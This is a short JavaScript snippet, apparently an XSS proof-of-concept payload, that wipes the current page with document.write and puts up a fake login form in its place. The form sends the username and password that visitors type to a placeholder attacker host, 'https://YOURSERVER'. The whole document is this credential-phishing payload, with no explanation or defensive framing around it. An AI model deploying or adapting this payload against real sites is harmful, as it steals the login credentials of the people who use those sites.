if (!window.__poc__) {
  window.__poc__ = 1;

  var form =
    '<form action="https://YOURSERVER" style="text-align:center">' +
      '<input name="username" placeholder="Username" ' +
        'style="display:block;margin:10px;padding:8px" required>' +
      '<input name="password" type="password" placeholder="Password" ' +
        'style="display:block;margin:10px;padding:8px" required>' +
      '<button type="submit" style="padding:8px 16px">Login</button>' +
    '</form>';

  document.open();
  document.write(
    '<div style="display:flex;justify-content:center;align-items:flex-start;' +
    'height:100vh;padding-top:100px;font-family:sans-serif">' + form + '</div>'
  );
  document.close();
}
